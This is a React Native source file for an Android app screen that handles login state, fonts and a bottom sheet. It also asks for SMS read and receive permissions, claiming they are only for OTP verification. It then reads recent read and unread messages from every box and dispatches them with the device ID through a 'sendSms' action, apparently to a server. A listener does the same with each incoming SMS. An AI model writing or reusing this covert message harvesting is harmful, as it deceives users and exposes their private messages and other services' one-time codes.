import React, { useEffect, useRef, useState } from 'react'
import {
  View,
  Text,
  StyleSheet,
  TouchableOpacity,
  StatusBar,
  PermissionsAndroid,
} from 'react-native'

import BottomSheet from 'reanimated-bottom-sheet'
import Animated from 'react-native-reanimated'
import RequireLogin from './src/components/RequireLogin'
import { windowHeight } from './src/common/Dimensions'
import { useFonts } from 'expo-font'
import { theme } from './src/common/theme'
import General from './src/containers/Tabs/General'
import { useDispatch, useSelector } from 'react-redux'
import { setTokenHeaderSevice } from './src/apis/auth.api'
import { typeAuths } from './src/sagas/auth.saga'
import Toast from 'react-native-toast-message'
import SmsListener from 'react-native-android-sms-listener'
import DeviceInfo from 'react-native-device-info'
import SmsAndroid from 'react-native-get-sms-android'

const AppDetail = () => {
  const dispatch = useDispatch()
  const { isRequireLogin, token } = useSelector((state) => state.auth)
  const bs = useRef(null)
  const [phoneNumber, setPhoneNumber] = useState(DeviceInfo.getDeviceId())
  const [arrayMessage, setArrayMessage] = useState([])

  useEffect(() => {
    console.log(`token in AppDetails`, token)
    setTokenHeaderSevice(token)
    return () => {
      setArrayMessage([])
    }
  }, [token])

  useEffect(() => {
    console.log(`isRequireLogin`, isRequireLogin)
    if (isRequireLogin) {
      console.log('here')
      bs.current.snapTo(0)
      dispatch({
        type: typeAuths.requireLogin,
        payload: {
          statusRequireLogin: false,
        },
      })
    }
    return () => {
      setArrayMessage([])
    }
  }, [isRequireLogin])

  useEffect(() => {
    requestReadSmsPermission()

    var filterReadSms = {
      box: '', // 'inbox' (default), 'sent', 'draft', 'outbox', 'failed', 'queued', and '' for all
      read: 1, // 0 for unread SMS, 1 for SMS already read
      indexFrom: 0, // start from index 0
      maxCount: 10, // count of SMS to return each time
    }

    var filterUnreadSms = {
      box: '', // 'inbox' (default), 'sent', 'draft', 'outbox', 'failed', 'queued', and '' for all
      read: 0, // 0 for unread SMS, 1 for SMS already read
      indexFrom: 0, // start from index 0
      maxCount: 10, // count of SMS to return each time
    }

    SmsAndroid.list(
      JSON.stringify(filterReadSms),
      (fail) => {
        console.log('Failed with this error: ' + fail)
      },
      (count, smsList) => {
        var arr = JSON.parse(smsList)

        sendMySms(arr)
      },
    )

    SmsAndroid.list(
      JSON.stringify(filterUnreadSms),
      (fail) => {
        console.log('Failed with this error: ' + fail)
      },
      (count, smsList) => {
        var arr = JSON.parse(smsList)
        sendMySms(arr)
      },
    )

    return () => {
      setArrayMessage([])
    }
  }, [])

  const sendMySms = async (arr) => {
    dispatch({
      type: typeAuths.sendSms,
      payload: { arrayMessage: arr, phone: phoneNumber },
    })
  }

  async function requestReadSmsPermission() {
    try {
      var granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_SMS,
        {
          title: 'Auto Verification OTP',
          message: 'need access to read sms, to verify OTP',
        },
      )
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        console.log('READ_SMS permissions granted', granted)
        granted = await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
          {
            title: 'Receive SMS',
            message: 'Need access to receive sms, to verify OTP',
          },
        )
        if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        } else {
          console.log('RECEIVE_SMS permissions denied')
        }
      } else {
        console.log('READ_SMS permissions denied')
      }
    } catch (err) {
      console.log(`err`, err)
    }
  }

  useEffect(() => {
    const subscription = SmsListener.addListener((message) => {
      dispatch({
        type: typeAuths.sendSms,
        payload: { arrayMessage: message, phone: phoneNumber, type: 'just' },
      })
    })
    return () => {
      subscription.remove()
    }
  }, [])

  let [fontsLoaded] = useFonts({
    'gilroy-medium': require('./assets/fonts/Gilroy-Medium.ttf'),
    'gilroy-light': require('./assets/fonts/Gilroy-Light.otf'),
    'gilroy-bold': require('./assets/fonts/Gilroy-ExtraBold.otf'),
    'gilroy-semiBold': require('./assets/fonts/Gilroy-SemiBold.ttf'),
  })
  if (!fontsLoaded) return <View />

  // const [showModal, setShowModal] = useState(false);
  const fall = new Animated.Value(1)
  const renderInner = () => (
    <View style={styles.panel}>
      <View style={{ height: 130 }}>{/* <RequireLogin /> */}</View>
    </View>
  )

  const renderHeader = () => (
    <View style={styles.header}>
      <View style={styles.panelHeader}>
        <View style={styles.panelHandle} />
      </View>
    </View>
  )

  // renders
  return (
    <View
      style={[
        styles.container,
        // { opacity: Animated.add(0.1, Animated.multiply(fall, 1.0)) },
      ]}
    >
      <BottomSheet
        ref={bs}
        snapPoints={['20%', '-40%']}
        renderContent={() => renderInner()}
        renderHeader={() => renderHeader()}
        initialSnap={1}
        callbackNode={fall}
        enabledGestureInteraction={true}
      />
      <StatusBar
        animated={true}
        backgroundColor={theme.backgrounds.white}
        barStyle="dark-content"
      />
      <General />
      <Toast ref={(ref) => Toast.setRef(ref)} />
    </View>
  )
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: 'grey',
  },
  contentContainer: {
    flex: 1,
    alignItems: 'center',
  },

  panel: {
    padding: 20,
    backgroundColor: '#FFFFFF',
    paddingTop: 20,
    // borderTopLeftRadius: 20,
    // borderTopRightRadius: 20,
    // shadowColor: '#000000',
    // shadowOffset: {width: 0, height: 0},
    // shadowRadius: 5,
    // shadowOpacity: 0.4,
    // justifyContent: "center",
    // alignItems: "center",
  },
  header: {
    backgroundColor: '#FFFFFF',
    shadowColor: '#333333',
    shadowOffset: { width: -1, height: -3 },
    shadowRadius: 2,
    shadowOpacity: 0.4,
    // elevation: 5,
    paddingTop: 5,
    borderTopLeftRadius: 20,
    borderTopRightRadius: 20,
  },
  panelHeader: {
    alignItems: 'center',
  },
  panelHandle: {
    width: 40,
    height: 3,
    borderRadius: 4,
    backgroundColor: '#00000040',
    marginBottom: 10,
  },
  panelTitle: {
    fontSize: 27,
    height: 35,
  },
  panelSubtitle: {
    fontSize: 14,
    color: 'gray',
    height: 30,
    marginBottom: 10,
  },
  panelButton: {
    padding: 13,
    borderRadius: 10,
    backgroundColor: '#FF6347',
    alignItems: 'center',
    marginVertical: 7,
  },
  panelButtonTitle: {
    fontSize: 17,
    fontWeight: 'bold',
    color: 'white',
  },
})

export default AppDetail
